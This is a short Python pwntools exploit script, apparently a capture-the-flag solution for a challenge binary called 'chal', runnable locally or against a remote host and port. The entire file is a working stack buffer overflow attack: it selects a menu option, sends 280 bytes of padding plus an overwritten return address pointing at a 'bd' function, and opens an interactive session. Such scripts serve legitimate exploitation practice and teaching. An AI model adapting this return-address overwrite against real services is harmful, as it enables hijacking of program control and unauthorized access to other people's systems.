
from pwn import *
import sys
# context.log_level = "debug"
bd = 0x0000000000401260
padding = b'A'*280

if len(sys.argv) == 1:
    r = process("./chal")
    # gdb.attach(r,'b gets')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
r.sendlineafter(b'(3) Fuse\n',b'3')
print(cyclic(400))
# r.sendlineafter(b'with?',cyclic(400))
r.sendlineafter(b'with?',padding+p64(bd))

r.interactive()
